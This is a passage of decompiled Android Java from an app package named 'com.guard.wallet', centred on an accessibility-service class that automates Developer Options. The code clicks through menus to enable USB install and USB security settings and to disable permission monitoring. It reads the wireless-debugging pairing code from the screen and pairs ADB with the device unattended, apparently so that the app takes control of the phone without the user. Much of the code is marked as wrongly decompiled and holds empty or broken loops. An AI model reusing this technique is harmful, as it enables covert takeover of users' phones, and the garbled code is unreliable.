     */
    /* JADX WARN: Code restructure failed: missing block: B:23:0x0084, code lost:
    
        com.guard.wallet.utils.AbstractC0251g.T0(1);
        r2.refresh();
        r7 = r2.checked();
     */
    /* JADX WARN: Code restructure failed: missing block: B:24:0x008e, code lost:
    
        r8 = r8 - 1;
     */
    /* JADX WARN: Code restructure failed: missing block: B:26:0x0060, code lost:
    
        r8 = move-exception;
     */
    /* JADX WARN: Code restructure failed: missing block: B:27:0x0061, code lost:
    
        r0 = r7;
        r7 = r8;
     */
    /* JADX WARN: Code restructure failed: missing block: B:31:0x0091, code lost:
    
        r0 = r7;
     */
    /* JADX WARN: Code restructure failed: missing block: B:34:0x0043, code lost:
    
        if (r2.click() == false) goto L28;
     */
    /* JADX WARN: Code restructure failed: missing block: B:35:0x0045, code lost:
    
        r1.setClicked(true);
        r2.refresh();
        r7 = r2.checked();
     */
    /* JADX WARN: Code restructure failed: missing block: B:36:0x004f, code lost:
    
        if (r8 <= 0) goto L52;
     */
    /* JADX WARN: Code restructure failed: missing block: B:37:0x0051, code lost:
    
        if (r7 != false) goto L51;
     */
    /* JADX WARN: Code restructure failed: missing block: B:38:0x0053, code lost:
    
        com.guard.wallet.utils.AbstractC0251g.T0(1);
        r2.refresh();
        r7 = r2.checked();
        r8 = r8 - 1;
     */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final CheckedResult g0(UiObject uiObject, int i2) {
        UiObject uiObject2;
        CombineFilter Q0;
        boolean z2 = false;
        AtomicInteger atomicInteger = new AtomicInteger(0);
        CheckedResult checkedResult = new CheckedResult();
        if (uiObject != null) {
            try {
            } catch (Exception e2) {
                e = e2;
                AbstractC0026q.m186s("PairAccessibilityDelegate", e);
                checkedResult.setChecked(z2);
                return checkedResult;
            }
            if (uiObject.checkable()) {
                uiObject2 = uiObject;
                Q0 = Q0();
                MyAccessibilityService.m548I(uiObject);
                while (uiObject != null && uiObject2 == null && atomicInteger.incrementAndGet() <= 3) {
                    uiObject2 = uiObject.findOneByCombine(Q0);
                    uiObject = uiObject.parent();
                }
                checkedResult.setChecked(z2);
                return checkedResult;
            }
        }
        uiObject2 = null;
        Q0 = Q0();
        MyAccessibilityService.m548I(uiObject);
        while (uiObject != null) {
            uiObject2 = uiObject.findOneByCombine(Q0);
            uiObject = uiObject.parent();
        }
        checkedResult.setChecked(z2);
        return checkedResult;
    }

    @Override // p012o.C0416e
    public final int hashCode() {
        return Objects.hash(a0.class.getName());
    }

    /* JADX WARN: Removed duplicated region for block: B:52:0x00f4 A[Catch: Exception -> 0x0171, TryCatch #2 {Exception -> 0x0171, blocks: (B:3:0x0006, B:8:0x0011, B:9:0x0014, B:12:0x002e, B:14:0x0047, B:16:0x004d, B:17:0x0058, B:19:0x0060, B:21:0x0066, B:22:0x0074, B:24:0x007a, B:27:0x0082, B:29:0x0088, B:32:0x0095, B:34:0x009b, B:36:0x00aa, B:38:0x00b0, B:39:0x00c9, B:42:0x00ba, B:44:0x00c0, B:52:0x00f4, B:54:0x00fb, B:56:0x0101, B:58:0x0107, B:60:0x0110, B:63:0x011d, B:65:0x0123, B:67:0x0129, B:75:0x014d, B:77:0x0153, B:80:0x0160, B:82:0x0166, B:88:0x0147, B:92:0x00ee, B:47:0x00cd, B:49:0x00e6, B:71:0x0136, B:73:0x0140), top: B:2:0x0006, inners: #0, #1 }] */
    /* JADX WARN: Removed duplicated region for block: B:54:0x00fb A[Catch: Exception -> 0x0171, TryCatch #2 {Exception -> 0x0171, blocks: (B:3:0x0006, B:8:0x0011, B:9:0x0014, B:12:0x002e, B:14:0x0047, B:16:0x004d, B:17:0x0058, B:19:0x0060, B:21:0x0066, B:22:0x0074, B:24:0x007a, B:27:0x0082, B:29:0x0088, B:32:0x0095, B:34:0x009b, B:36:0x00aa, B:38:0x00b0, B:39:0x00c9, B:42:0x00ba, B:44:0x00c0, B:52:0x00f4, B:54:0x00fb, B:56:0x0101, B:58:0x0107, B:60:0x0110, B:63:0x011d, B:65:0x0123, B:67:0x0129, B:75:0x014d, B:77:0x0153, B:80:0x0160, B:82:0x0166, B:88:0x0147, B:92:0x00ee, B:47:0x00cd, B:49:0x00e6, B:71:0x0136, B:73:0x0140), top: B:2:0x0006, inners: #0, #1 }] */
    /* JADX WARN: Removed duplicated region for block: B:75:0x014d A[Catch: Exception -> 0x0171, TryCatch #2 {Exception -> 0x0171, blocks: (B:3:0x0006, B:8:0x0011, B:9:0x0014, B:12:0x002e, B:14:0x0047, B:16:0x004d, B:17:0x0058, B:19:0x0060, B:21:0x0066, B:22:0x0074, B:24:0x007a, B:27:0x0082, B:29:0x0088, B:32:0x0095, B:34:0x009b, B:36:0x00aa, B:38:0x00b0, B:39:0x00c9, B:42:0x00ba, B:44:0x00c0, B:52:0x00f4, B:54:0x00fb, B:56:0x0101, B:58:0x0107, B:60:0x0110, B:63:0x011d, B:65:0x0123, B:67:0x0129, B:75:0x014d, B:77:0x0153, B:80:0x0160, B:82:0x0166, B:88:0x0147, B:92:0x00ee, B:47:0x00cd, B:49:0x00e6, B:71:0x0136, B:73:0x0140), top: B:2:0x0006, inners: #0, #1 }] */
    /* JADX WARN: Removed duplicated region for block: B:80:0x0160 A[Catch: Exception -> 0x0171, TryCatch #2 {Exception -> 0x0171, blocks: (B:3:0x0006, B:8:0x0011, B:9:0x0014, B:12:0x002e, B:14:0x0047, B:16:0x004d, B:17:0x0058, B:19:0x0060, B:21:0x0066, B:22:0x0074, B:24:0x007a, B:27:0x0082, B:29:0x0088, B:32:0x0095, B:34:0x009b, B:36:0x00aa, B:38:0x00b0, B:39:0x00c9, B:42:0x00ba, B:44:0x00c0, B:52:0x00f4, B:54:0x00fb, B:56:0x0101, B:58:0x0107, B:60:0x0110, B:63:0x011d, B:65:0x0123, B:67:0x0129, B:75:0x014d, B:77:0x0153, B:80:0x0160, B:82:0x0166, B:88:0x0147, B:92:0x00ee, B:47:0x00cd, B:49:0x00e6, B:71:0x0136, B:73:0x0140), top: B:2:0x0006, inners: #0, #1 }] */
    @Override // p012o.C0416e
    /* renamed from: u */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final void mo1002u(AccessibilityEvent accessibilityEvent, String str, String str2) {
        boolean z2;
        LinkedList linkedList;
        Runnable runnable;
        try {
            if (this.f843r.get()) {
                return;
            }
            if (accessibilityEvent != null) {
                super.mo1002u(accessibilityEvent, str, str2);
            }
            boolean m995L = m995L();
            EnumC0894g enumC0894g = EnumC0894g.PAIR_DEPT_PAIR_SUCCESS;
            AtomicReference atomicReference = this.f841p;
            ConcurrentLinkedQueue concurrentLinkedQueue = this.f840o;
            final int i2 = 1;
            final int i3 = 0;
            String str3 = this.f864c;
            if (m995L) {
                concurrentLinkedQueue.remove("pairInWifiDebugWindow");
                concurrentLinkedQueue.remove("pairInPairCodeDialog");
                concurrentLinkedQueue.remove("pairInPairFailDialog");
                concurrentLinkedQueue.remove("pairInConfirmLock");
                concurrentLinkedQueue.remove("pairInSecurityCenter");
                Object obj = atomicReference.get();
                EnumC0894g enumC0894g2 = EnumC0894g.PAIR_DEPT_UNKNOWN;
                if (obj == enumC0894g2 && !concurrentLinkedQueue.contains("pairInDevOption")) {
                    concurrentLinkedQueue.add("pairInDevOption");
                    AbstractC0243l.m593c(new Runnable(this) { // from class: o.y

                        /* renamed from: b */
                        public final /* synthetic */ a0 f975b;

                        {
                            this.f975b = this;
                        }

                        /* JADX WARN: Removed duplicated region for block: B:107:0x01a8 A[Catch: Exception -> 0x01a4, TRY_LEAVE, TryCatch #14 {Exception -> 0x01a4, blocks: (B:102:0x0192, B:104:0x0198, B:107:0x01a8), top: B:101:0x0192 }] */
                        /* JADX WARN: Removed duplicated region for block: B:111:0x01b7 A[Catch: Exception -> 0x01e3, TryCatch #15 {Exception -> 0x01e3, blocks: (B:94:0x016e, B:96:0x0178, B:111:0x01b7, B:113:0x01c9, B:115:0x01cf, B:118:0x01df, B:123:0x01b1), top: B:93:0x016e }] */
                        /* JADX WARN: Removed duplicated region for block: B:120:0x01dd  */
                        /* JADX WARN: Removed duplicated region for block: B:216:0x0357 A[Catch: Exception -> 0x0369, TryCatch #6 {Exception -> 0x0369, blocks: (B:204:0x02e0, B:206:0x02e6, B:208:0x02f8, B:210:0x0313, B:212:0x0329, B:214:0x0338, B:216:0x0357, B:217:0x035f, B:219:0x0363, B:276:0x0351, B:278:0x0318), top: B:203:0x02e0, outer: #0 }] */
                        /* JADX WARN: Removed duplicated region for block: B:219:0x0363 A[Catch: Exception -> 0x0369, TRY_LEAVE, TryCatch #6 {Exception -> 0x0369, blocks: (B:204:0x02e0, B:206:0x02e6, B:208:0x02f8, B:210:0x0313, B:212:0x0329, B:214:0x0338, B:216:0x0357, B:217:0x035f, B:219:0x0363, B:276:0x0351, B:278:0x0318), top: B:203:0x02e0, outer: #0 }] */
                        /* JADX WARN: Removed duplicated region for block: B:241:0x03fe A[Catch: Exception -> 0x0409, TryCatch #5 {Exception -> 0x0409, blocks: (B:228:0x0384, B:230:0x038a, B:232:0x039d, B:234:0x03b8, B:236:0x03ce, B:238:0x03dd, B:239:0x03fa, B:241:0x03fe, B:243:0x0403, B:268:0x03f6, B:270:0x03bd), top: B:227:0x0384, outer: #0 }] */
                        /* JADX WARN: Removed duplicated region for block: B:243:0x0403 A[Catch: Exception -> 0x0409, TRY_LEAVE, TryCatch #5 {Exception -> 0x0409, blocks: (B:228:0x0384, B:230:0x038a, B:232:0x039d, B:234:0x03b8, B:236:0x03ce, B:238:0x03dd, B:239:0x03fa, B:241:0x03fe, B:243:0x0403, B:268:0x03f6, B:270:0x03bd), top: B:227:0x0384, outer: #0 }] */
                        /* JADX WARN: Removed duplicated region for block: B:246:0x0418 A[EXC_TOP_SPLITTER, SYNTHETIC] */
                        /* JADX WARN: Removed duplicated region for block: B:253:0x042e A[ADDED_TO_REGION] */
                        /* JADX WARN: Removed duplicated region for block: B:262:0x043b A[ADDED_TO_REGION, SYNTHETIC] */
                        /* JADX WARN: Removed duplicated region for block: B:318:0x04da A[Catch: Exception -> 0x04e9, LOOP:8: B:310:0x04b8->B:318:0x04da, LOOP_END, TryCatch #4 {Exception -> 0x04e9, blocks: (B:295:0x0460, B:297:0x0473, B:299:0x0479, B:301:0x047f, B:303:0x048c, B:305:0x049a, B:307:0x04a5, B:309:0x04b0, B:318:0x04da, B:320:0x04e3, B:325:0x04d4, B:311:0x04b8, B:313:0x04be, B:315:0x04cc), top: B:294:0x0460, inners: #7 }] */
                        /* JADX WARN: Removed duplicated region for block: B:319:0x04e3 A[SYNTHETIC] */
                        @Override // java.lang.Runnable
                        /*
                            Code decompiled incorrectly, please refer to instructions dump.
                        */
                        public final void run() {
                            boolean z3;
                            boolean m998O;
                            UiObject findOneByCombine;
                            String str4;
                            boolean z4;
                            UiObject findOneByCombine2;
                            String str5;
                            boolean z5;
                            UiObject uiObject;
                            UiObject uiObject2;
                            UiObject uiObject3;
                            String str6;
                            CombineFilter u02;
                            EnumC0894g enumC0894g3 = EnumC0894g.PAIR_DEPT_PAIR_SUCCESS;
                            int i4 = i3;
                            boolean z6 = true;
                            a0 a0Var = this.f975b;
                            switch (i4) {
                                case 0:
                                    a0.m982H(a0Var);
                                    break;
                                case 1:
                                    a0.m982H(a0Var);
                                    break;
                                case 2:
                                    a0Var.getClass();
                                    try {
                                        if (a0.t0()) {
                                            a0Var.f841p.set(EnumC0894g.PAIR_DEPT_PAIR_PREPARE_FINISH);
                                            if (AbstractC0249e.m620i()) {
                                                AtomicInteger atomicInteger = new AtomicInteger(0);
                                                while (true) {
                                                    try {
                                                        UiObject f02 = a0Var.f0();
                                                        if (f02 != null && f02.canScrollForward()) {
                                                            f02.scrollForwardEnd();
                                                            a0Var.m1061F(MyAccessibilityService.m554P().l0(false).getActiveFastRoot());
                                                            AbstractC0251g.T0(5);
                                                            f02 = a0Var.f0();
                                                        }
                                                        if (f02 != null) {
                                                            uiObject = f02.canScrollBackward() ? f02.scrollBackwardUtil(a0.F0()) : null;
                                                            if (uiObject == null && f02.canScrollForward()) {
                                                                uiObject = f02.scrollForwardUtil(a0.F0());
                                                            }
                                                        } else {
                                                            uiObject = null;
                                                        }
                                                        if (uiObject != null && uiObject.parent() != null && a0Var.g0(uiObject.parent(), 20).isChecked()) {
                                                            a0Var.f844s = true;
                                                            Log.d("PairAccessibilityDelegate", "禁用权限监控已勾选");
                                                        }
                                                    } catch (Exception e2) {
                                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e2);
                                                    }
                                                    if (!a0Var.f844s && atomicInteger.incrementAndGet() <= 10) {
                                                        AbstractC0251g.T0(10);
                                                    }
                                                }
                                                AbstractC0184g.m354h(80);
                                                a0Var.D0();
                                            }
                                            if (AbstractC0249e.m624m()) {
                                                AtomicInteger atomicInteger2 = new AtomicInteger(0);
                                                while (true) {
                                                    try {
                                                        UiObject f03 = a0Var.f0();
                                                        if (f03 != null) {
                                                            Log.d("PairAccessibilityDelegate", "开发者选项窗口滚动视图查找成功");
                                                            C0981d c0981d = new C0981d(a0.R0(), 2, 0);
                                                            findOneByCombine2 = f03.scrollForwardUtil(c0981d);
                                                            if (findOneByCombine2 == null) {
                                                                f03.scrollBackwardEnd();
                                                                a0Var.m1061F(MyAccessibilityService.m554P().l0(false).getActiveFastRoot());
                                                                AbstractC0251g.T0(5);
                                                                UiObject f04 = a0Var.f0();
                                                                if (f04 != null) {
                                                                    findOneByCombine2 = f04.scrollForwardUtil(c0981d);
                                                                }
                                                            }
                                                        } else {
                                                            Log.e("PairAccessibilityDelegate", "开发者选项窗口滚动视图查找失败");
                                                            findOneByCombine2 = a0Var.m1072k().findOneByCombine(a0.R0());
                                                        }
                                                    } catch (Exception e3) {
                                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e3);
                                                    }
                                                    if (findOneByCombine2 != null) {
                                                        Log.d("PairAccessibilityDelegate", "USB安装栏目查找成功");
                                                        UiObject findParentUtilCombine = findOneByCombine2.findParentUtilCombine(a0.q0());
                                                        if (findParentUtilCombine != null) {
                                                            Log.d("PairAccessibilityDelegate", "USB安装可点击栏目查找成功");
                                                            CheckedResult e02 = a0.e0(findParentUtilCombine);
                                                            a0Var.f845t = e02.isChecked();
                                                            z5 = e02.isClicked();
                                                            if (z5) {
                                                                Log.d("PairAccessibilityDelegate", "USB安装已点击");
                                                                AbstractC0251g.T0(10);
                                                            }
                                                            if (a0Var.f845t) {
                                                                Log.d("PairAccessibilityDelegate", "USB安装已勾选");
                                                            }
                                                            if (a0Var.f845t && atomicInteger2.incrementAndGet() <= 10) {
                                                                AbstractC0251g.T0(10);
                                                            }
                                                        } else {
                                                            str5 = "USB安装可点击栏目查找失败";
                                                        }
                                                    } else {
                                                        str5 = "USB安装栏目查找失败";
                                                    }
                                                    Log.e("PairAccessibilityDelegate", str5);
                                                    z5 = false;
                                                    if (z5) {
                                                    }
                                                    if (a0Var.f845t) {
                                                    }
                                                    if (a0Var.f845t) {
                                                    }
                                                }
                                                AbstractC0184g.m354h(70);
                                                atomicInteger2.set(0);
                                                while (true) {
                                                    try {
                                                        UiObject f05 = a0Var.f0();
                                                        if (f05 != null) {
                                                            Log.d("PairAccessibilityDelegate", "开发者选项窗口滚动视图查找成功");
                                                            C0981d c0981d2 = new C0981d(a0.S0(), 3, 0);
                                                            findOneByCombine = f05.scrollForwardUtil(c0981d2);
                                                            if (findOneByCombine == null) {
                                                                f05.scrollBackwardEnd();
                                                                a0Var.m1061F(MyAccessibilityService.m554P().l0(false).getActiveFastRoot());
                                                                AbstractC0251g.T0(5);
                                                                UiObject f06 = a0Var.f0();
                                                                if (f06 != null) {
                                                                    findOneByCombine = f06.scrollForwardUtil(c0981d2);
                                                                }
                                                            }
                                                        } else {
                                                            Log.e("PairAccessibilityDelegate", "开发者选项窗口滚动视图查找失败");
                                                            findOneByCombine = a0Var.m1072k().findOneByCombine(a0.S0());
                                                        }
                                                    } catch (Exception e4) {
                                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e4);
                                                    }
                                                    if (findOneByCombine != null) {
                                                        Log.d("PairAccessibilityDelegate", "USB安全设置栏目查找成功");
                                                        UiObject findParentUtilCombine2 = findOneByCombine.findParentUtilCombine(a0.q0());
                                                        if (findParentUtilCombine2 != null) {
                                                            Log.d("PairAccessibilityDelegate", "USB安全设置可点击栏目查找成功");
                                                            CheckedResult e03 = a0.e0(findParentUtilCombine2);
                                                            a0Var.f846u = e03.isChecked();
                                                            z4 = e03.isClicked();
                                                            if (a0Var.f846u) {
                                                                Log.d("PairAccessibilityDelegate", "USB安全设置已勾选");
                                                            }
                                                            if (z4) {
                                                                Log.d("PairAccessibilityDelegate", "USB安全设置点击成功");
                                                            }
                                                            AtomicInteger atomicInteger3 = new AtomicInteger(10);
                                                            for (m998O = a0Var.m998O(); !m998O; m998O = a0Var.m998O()) {
                                                                try {
                                                                } catch (Exception e5) {
                                                                    AbstractC0026q.m186s("PairAccessibilityDelegate", e5);
                                                                }
                                                                if (atomicInteger3.decrementAndGet() >= 0) {
                                                                    AbstractC0251g.T0(1);
                                                                } else if (!a0Var.f846u && !m998O && atomicInteger2.incrementAndGet() <= 10) {
                                                                    AbstractC0251g.T0(10);
                                                                }
                                                            }
                                                            if (!a0Var.f846u) {
                                                            }
                                                        } else {
                                                            str4 = "USB安全设置可点击栏目查找失败";
                                                        }
                                                    } else {
                                                        str4 = "USB安全设置栏目查找失败";
                                                    }
                                                    Log.e("PairAccessibilityDelegate", str4);
                                                    z4 = false;
                                                    if (a0Var.f846u) {
                                                    }
                                                    if (z4) {
                                                    }
                                                    AtomicInteger atomicInteger32 = new AtomicInteger(10);
                                                    while (!m998O) {
                                                    }
                                                    if (!a0Var.f846u) {
                                                    }
                                                }
                                                AbstractC0184g.m354h(80);
                                                if (a0Var.f846u) {
                                                    Log.d("PairAccessibilityDelegate", "USB安全设置已勾选");
                                                }
                                            }
                                            a0Var.f840o.remove("pairInPrepareFinish");
                                            break;
                                        }
                                        a0Var.D0();
                                        a0Var.f840o.remove("pairInPrepareFinish");
                                    } catch (Exception e6) {
                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e6);
                                        return;
                                    }
                                    break;
                                case 3:
                                    a0Var.getClass();
                                    try {
                                        a0Var.f840o.remove("pairInPairSuccess");
                                        if (!a0.t0()) {
                                            a0Var.D0();
                                            break;
                                        } else {
                                            if (AbstractC0249e.m624m() && Build.VERSION.SDK_INT >= 35) {
                                                if (AbstractC0026q.m172b()) {
                                                    AbstractC0251g.T0(5);
                                                    if (!AbstractC0026q.m150A()) {
                                                        AbstractC0026q.m164O(null, null);
                                                    }
                                                }
                                                if (AbstractC0251g.f1()) {
                                                }
                                            }
                                            try {
                                                AbstractC0251g.F0(1);
                                                Log.d("PairAccessibilityDelegate", "GlobalActionAutomator back");
                                                Thread.sleep(100L);
                                                break;
                                            } catch (Exception e7) {
                                                AbstractC0026q.m186s("PairAccessibilityDelegate", e7);
                                                return;
                                            }
                                        }
                                    } catch (Exception e8) {
                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e8);
                                        return;
                                    }
                                    break;
                                case 4:
                                    AtomicReference atomicReference2 = a0Var.f841p;
                                    try {
                                        if (!Objects.equals(atomicReference2.get(), enumC0894g3)) {
                                            a0Var.m1062G();
                                            Log.d("PairAccessibilityDelegate", "active root complete");
                                            atomicReference2.set(EnumC0894g.PAIR_DEPT_PAIR_LEAVE_DEV_OPT);
                                            a0.m985R(a0Var.m1072k());
                                            try {
                                                u02 = a0.u0();
                                                uiObject2 = null;
                                            } catch (Exception e9) {
                                                e = e9;
                                                uiObject2 = null;
                                            }
                                            while (uiObject2 == null) {
                                                try {
                                                } catch (Exception e10) {
                                                    e = e10;
                                                    AbstractC0026q.m186s("PairAccessibilityDelegate", e);
                                                    uiObject3 = uiObject2;
                                                    if (uiObject3 != null) {
                                                    }
                                                    Log.e("PairAccessibilityDelegate", str6);
                                                    return;
                                                }
                                                if (a0Var.m1072k() != null) {
                                                    uiObject2 = a0Var.m1072k().findOneByCombine(u02);
                                                    AbstractC0251g.T0(5);
                                                } else {
                                                    if (uiObject2 != null) {
                                                        Log.d("PairAccessibilityDelegate", "使用配对码配对栏目查找成功");
                                                    }
                                                    uiObject3 = uiObject2;
                                                    if (uiObject3 != null) {
                                                        Log.d("PairAccessibilityDelegate", "使用配对码配对栏目查找成功");
                                                        AbstractC0184g.m354h(30);
                                                        UiObject findParentUtilCombine3 = uiObject3.findParentUtilCombine(a0.m987T());
                                                        if (findParentUtilCombine3 != null && findParentUtilCombine3.click()) {
                                                            Log.d("PairAccessibilityDelegate", "使用配对码配对栏目已点击");
                                                            AbstractC0184g.m354h(35);
                                                            break;
                                                        } else {
                                                            str6 = "使用配对码配对栏目点击失败";
                                                        }
                                                    } else {
                                                        str6 = "使用配对码配对栏目查找失败";
                                                    }
                                                    Log.e("PairAccessibilityDelegate", str6);
                                                }
                                            }
                                            if (uiObject2 != null) {
                                            }
                                            uiObject3 = uiObject2;
                                            if (uiObject3 != null) {
                                            }
                                            Log.e("PairAccessibilityDelegate", str6);
                                        }
                                    } catch (Exception e11) {
                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e11);
                                        return;
                                    }
                                    break;
                                case 5:
                                    a0Var.getClass();
                                    try {
                                        boolean m996M = a0Var.m996M();
                                        AtomicReference atomicReference3 = a0Var.f841p;
                                        String str7 = a0Var.f864c;
                                        if (m996M && !a0Var.m1000Q() && !Objects.equals(atomicReference3.get(), enumC0894g3)) {
                                            Object obj2 = atomicReference3.get();
                                            EnumC0894g enumC0894g4 = EnumC0894g.PAIR_DEPT_PAIRING;
                                            if (!Objects.equals(obj2, enumC0894g4)) {
                                                Log.d("PairAccessibilityDelegate", "pairInPairCodeDialog 窗口匹配");
                                                a0Var.m1062G();
                                                Log.d("PairAccessibilityDelegate", "active root complete");
                                                atomicReference3.set(enumC0894g4);
                                                Future m592b = AbstractC0243l.m592b(new CallableC0239h(a0Var), str7);
                                                if (m592b != null) {
                                                    while (!m592b.isDone()) {
                                                        Log.d("PairAccessibilityDelegate", "正在读取配对码和配对端口");
                                                        AbstractC0251g.T0(2);
                                                    }
                                                    try {
                                                        PairPortAndCodeResult pairPortAndCodeResult = (PairPortAndCodeResult) m592b.get();
                                                        if (pairPortAndCodeResult != null) {
                                                            Log.d("PairAccessibilityDelegate", "读取配对码和配对端口完成");
                                                            AbstractC0184g.m354h(40);
                                                            if (C0318e.m844S() != null) {
                                                                Log.d("PairAccessibilityDelegate", "正在发起配对");
                                                                C0318e.m844S().f615m.set(false);
                                                                C0318e.m844S().m852K(pairPortAndCodeResult.getHost(), pairPortAndCodeResult.getPairPort().intValue(), pairPortAndCodeResult.getPairCode());
                                                                if (C0318e.m844S().m860U()) {
                                                                    Log.d("PairAccessibilityDelegate", "本次配对成功");
                                                                    AbstractC0184g.m354h(45);
                                                                    atomicReference3.set(enumC0894g3);
                                                                } else {
                                                                    Log.d("PairAccessibilityDelegate", "本次配对失败");
                                                                }
                                                            }
                                                        } else {
                                                            Log.e("PairAccessibilityDelegate", "读取配对码和配对端口失败");
                                                        }
                                                    } catch (Exception e12) {
                                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e12);
                                                    }
                                                }
                                            }
                                        }
                                        if (!Objects.equals(atomicReference3.get(), enumC0894g3)) {
                                            atomicReference3.set(EnumC0894g.PAIR_DEPT_PAIR_FAIL);
                                        }
                                        if (a0Var.m996M()) {
                                            Log.e("PairAccessibilityDelegate", "配对结束,仍然停留在配对码窗口");
                                            if (atomicReference3.get() != enumC0894g3) {
                                                z6 = false;
                                            }
                                            AbstractC0243l.m592b(new CallableC0238g(z6, a0Var), str7);
                                            break;
                                        }
                                    } catch (Exception e13) {
                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e13);
                                        return;
                                    }
                                    break;
                                case 6:
                                    a0Var.getClass();
                                    while (a0Var.m997N()) {
                                        try {
                                            UiObject findOneByCombine3 = a0Var.m1072k().findOneByCombine(a0.m989V());
                                            if (findOneByCombine3 != null && findOneByCombine3.click()) {
                                                Log.d("PairAccessibilityDelegate", "配对失败对话框确定按钮查找并点击完成");
                                                AbstractC0251g.T0(10);
                                            }
                                        } catch (Exception e14) {
                                            AbstractC0026q.m186s("PairAccessibilityDelegate", e14);
                                            return;
                                        }
                                    }
                                    ConcurrentLinkedQueue concurrentLinkedQueue2 = a0Var.f840o;
                                    concurrentLinkedQueue2.remove("pairInWifiDebugWindow");
                                    concurrentLinkedQueue2.remove("pairInPairCodeDialog");
                                    concurrentLinkedQueue2.remove("pairInPairFailDialog");
                                    break;
                                case 7:
                                    a0Var.getClass();
                                    while (a0Var.m1078q(C0420i.m1117L())) {
                                        try {
                                            try {
                                                AbstractC0251g.F0(1);
                                                Log.d("PairAccessibilityDelegate", "GlobalActionAutomator back");
                                                Thread.sleep(100L);
                                            } catch (Exception e15) {
                                                AbstractC0026q.m186s("PairAccessibilityDelegate", e15);
                                            }
                                            AbstractC0251g.T0(5);
                                        } catch (Exception e16) {
                                            AbstractC0026q.m186s("PairAccessibilityDelegate", e16);
                                        }
                                    }
                                    break;
                                default:
                                    a0Var.getClass();
                                    try {
                                        Log.d("PairAccessibilityDelegate", "pairInSecurityCenter 窗口匹配");
                                        UiObject findOneByCombine4 = a0Var.m1072k().findOneByCombine(a0.K0());
                                        if (findOneByCombine4 != null && findOneByCombine4.clickable() && findOneByCombine4.click()) {
                                            Log.d("PairAccessibilityDelegate", "USB安装设置窗口下一步按钮查找并点击完成");
                                            a0Var.f840o.remove("pairInSecurityCenter");
                                            break;
                                        } else {
                                            UiObject findOneByCombine5 = a0Var.m1072k().findOneByCombine(a0.J0());
                                            if (findOneByCombine5 != null) {
                                                Log.d("PairAccessibilityDelegate", "USB安装设置窗口允许按钮查找完成");
                                                if (findOneByCombine5.clickable()) {
                                                    Log.d("PairAccessibilityDelegate", "USB安装设置窗口允许按钮已可以点击");
                                                    if (findOneByCombine5.click()) {
                                                        Log.d("PairAccessibilityDelegate", "USB安装设置窗口允许按钮点击完成");
                                                        AbstractC0251g.T0(10);
                                                        while (true) {
                                                            try {
                                                            } catch (Exception e17) {
                                                                AbstractC0026q.m186s("PairAccessibilityDelegate", e17);
                                                            }
                                                            if (a0Var.m1072k() != null && a0Var.m1072k().findOneByCombine(a0.L0()) != null) {
                                                                Log.d("PairAccessibilityDelegate", "当前处于USB安全设置对话框");
                                                                z3 = true;
                                                                if (z3) {
                                                                    a0Var.f846u = true;
                                                                    a0Var.D0();
                                                                    break;
                                                                } else {
                                                                    Log.d("PairAccessibilityDelegate", "正在开启USB安全设置....");
                                                                    AbstractC0251g.T0(5);
                                                                }
                                                            }
                                                            z3 = false;
                                                            if (z3) {
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    } catch (Exception e18) {
                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e18);
                                        return;
                                    }
                                    break;
                            }
                        }
                    }, str3);
                }
                if (atomicReference.get() == EnumC0894g.PAIR_DEPT_PAIR_RETRY && !concurrentLinkedQueue.contains("pairInDevOption")) {
                    atomicReference.set(enumC0894g2);
                    concurrentLinkedQueue.add("pairInDevOption");
                    AbstractC0243l.m593c(new Runnable(this) { // from class: o.y

                        /* renamed from: b */
                        public final /* synthetic */ a0 f975b;

                        {
                            this.f975b = this;
                        }

                        /* JADX WARN: Removed duplicated region for block: B:107:0x01a8 A[Catch: Exception -> 0x01a4, TRY_LEAVE, TryCatch #14 {Exception -> 0x01a4, blocks: (B:102:0x0192, B:104:0x0198, B:107:0x01a8), top: B:101:0x0192 }] */
                        /* JADX WARN: Removed duplicated region for block: B:111:0x01b7 A[Catch: Exception -> 0x01e3, TryCatch #15 {Exception -> 0x01e3, blocks: (B:94:0x016e, B:96:0x0178, B:111:0x01b7, B:113:0x01c9, B:115:0x01cf, B:118:0x01df, B:123:0x01b1), top: B:93:0x016e }] */
                        /* JADX WARN: Removed duplicated region for block: B:120:0x01dd  */
                        /* JADX WARN: Removed duplicated region for block: B:216:0x0357 A[Catch: Exception -> 0x0369, TryCatch #6 {Exception -> 0x0369, blocks: (B:204:0x02e0, B:206:0x02e6, B:208:0x02f8, B:210:0x0313, B:212:0x0329, B:214:0x0338, B:216:0x0357, B:217:0x035f, B:219:0x0363, B:276:0x0351, B:278:0x0318), top: B:203:0x02e0, outer: #0 }] */
                        /* JADX WARN: Removed duplicated region for block: B:219:0x0363 A[Catch: Exception -> 0x0369, TRY_LEAVE, TryCatch #6 {Exception -> 0x0369, blocks: (B:204:0x02e0, B:206:0x02e6, B:208:0x02f8, B:210:0x0313, B:212:0x0329, B:214:0x0338, B:216:0x0357, B:217:0x035f, B:219:0x0363, B:276:0x0351, B:278:0x0318), top: B:203:0x02e0, outer: #0 }] */
                        /* JADX WARN: Removed duplicated region for block: B:241:0x03fe A[Catch: Exception -> 0x0409, TryCatch #5 {Exception -> 0x0409, blocks: (B:228:0x0384, B:230:0x038a, B:232:0x039d, B:234:0x03b8, B:236:0x03ce, B:238:0x03dd, B:239:0x03fa, B:241:0x03fe, B:243:0x0403, B:268:0x03f6, B:270:0x03bd), top: B:227:0x0384, outer: #0 }] */
                        /* JADX WARN: Removed duplicated region for block: B:243:0x0403 A[Catch: Exception -> 0x0409, TRY_LEAVE, TryCatch #5 {Exception -> 0x0409, blocks: (B:228:0x0384, B:230:0x038a, B:232:0x039d, B:234:0x03b8, B:236:0x03ce, B:238:0x03dd, B:239:0x03fa, B:241:0x03fe, B:243:0x0403, B:268:0x03f6, B:270:0x03bd), top: B:227:0x0384, outer: #0 }] */
                        /* JADX WARN: Removed duplicated region for block: B:246:0x0418 A[EXC_TOP_SPLITTER, SYNTHETIC] */
